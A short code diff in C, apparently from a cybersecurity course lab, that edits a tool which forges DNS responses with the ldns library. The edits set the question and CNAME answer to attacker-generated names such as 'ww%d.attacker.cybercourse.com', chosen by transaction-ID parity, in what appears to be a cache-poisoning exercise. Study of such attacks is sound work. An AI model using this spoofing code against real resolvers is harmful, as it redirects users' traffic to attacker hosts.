@@ -41,7 +41,7 @@ int create_dns_response(int txid, const char* query_name) {
     ldns_pkt_set_qr(packet, true);  // Set QR (Query/Response) flag to Response
 
     // Step 3: Create the Question Section
-    ldns_rdf *domain = ldns_dname_new_frm_str(QUERY_DOMAIN);
+    ldns_rdf *domain = ldns_dname_new_frm_str(query_name);
     if (!domain) {
         fprintf(stderr, "Failed to create domain RDF.\n");
         ldns_pkt_free(packet);
@@ -56,7 +56,7 @@ int create_dns_response(int txid, const char* query_name) {
 
     // Step 4: Create the Answer Section using ldns_rr_new_frm_str
     char answer_rr_str[256];
-    snprintf(answer_rr_str, sizeof(answer_rr_str), "%s 10 IN CNAME %s", QUERY_DOMAIN, query_name);
+    snprintf(answer_rr_str, sizeof(answer_rr_str), "%s 10 IN CNAME %s", query_name, query_name);
 
     if (ldns_rr_new_frm_str(&answer_rr, answer_rr_str, (uint8_t) 3600, domain, NULL) != LDNS_STATUS_OK) {
         fprintf(stderr, "Failed to create answer RR from string.\n");
@@ -156,6 +156,7 @@ int even_odd_part(uint16_t txid, struct sockaddr_in client_addr, int* counter, i
     if (txid & 1){
         char response_n[30];
         sprintf(response_n, "ww%d.attacker.cybercourse.com", *counter);
+        printf("%s\n",response_n);
         *counter += 1;
         create_dns_response(txid, response_n);
         return 0;
